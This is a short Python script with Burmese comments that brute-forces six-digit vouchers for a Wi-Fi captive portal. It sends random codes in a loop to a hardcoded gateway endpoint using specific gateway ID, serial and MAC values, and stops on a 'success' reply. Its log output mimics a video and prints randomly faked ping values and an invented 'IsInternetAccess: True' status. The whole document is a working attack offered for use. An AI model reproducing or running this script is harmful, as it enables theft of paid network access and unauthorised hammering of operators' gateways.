import time
import random
import os
import sys
import requests
from datetime import datetime

# အရောင်များ
GREEN = '\033[92m'
WHITE = '\033[97m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
END = '\033[0m'

url = "http://10.44.77.240:2060/expire_tip"

def start_scanning():
    os.system('clear')
    
    # အစပိုင်း စာတန်းများ
    print(f"{WHITE}[+] Starting...")
    print(f"[+] If you are getting stuck or not log contents")
    print(f"    are print for a wile turn on/off your wifi{END}\n")
    
    time.sleep(1.0)

    while True:
        # 6-digit voucher code ထုတ်ခြင်း
        code = str(random.randint(0, 999999)).zfill(6)
        
        # လက်ရှိအချိန်ကို ဗီဒီယိုထဲကအတိုင်း (နာရီ-မိနစ်-စက္ကန့်) ယူခြင်း
        current_time = datetime.now().strftime("%H-%M-%S")
        
        params = {
            'gw_id': '984a6ba4b7ef',
            'gw_sn': 'H1TB01V00212C',
            'gw_address': '192.168.110.1',
            'mac': 'a6:a9:6f:93:0b:bb',
            'voucher': code
        }

        try:
            # ဗီဒီယိုထဲကအတိုင်း status 200 ပြနိုင်ရန် တောင်းဆိုခြင်း
            res = requests.get(url, params=params, timeout=1.5)
            status_code = res.status_code
            
            # ဒုတိယပုံ (1000018185.jpg) ထဲကအတိုင်း Log ပုံစံ ထုတ်ပေးခြင်း
            # ping တန်ဖိုးကို random ပြောင်းလဲပေးထားပါသည်
            ping_val = random.randint(50, 80)
            
            print(f"{WHITE}Log: {{time: {current_time}, status: {status_code}, ping: {GREEN}{ping_val}{WHITE}, IsInternetAccess: True}}{END}")

            # အကယ်၍ Success ဖြစ်ခဲ့လျှင် (status 200 နှင့် message စစ်ဆေးမှု)
            if res.status_code == 200 and "success" in res.text.lower():
                print(f"{GREEN}\n[SUCCESS] VALID VOUCHER FOUND: {code}{END}")
                break
                
        except Exception:
            # Connection error ဖြစ်လျှင်လည်း Log ပုံစံအတိုင်းပြမည်
            print(f"{WHITE}Log: {{time: {current_time}, status: Error, ping: 0, IsInternetAccess: False}}{END}")
        
        # Log တွေ အရမ်းမမြန်လွန်းစေရန် အချိန်အနည်းငယ်စောင့်ခိုင်းခြင်း
        time.sleep(0.5)

if __name__ == "__main__":
    start_scanning()
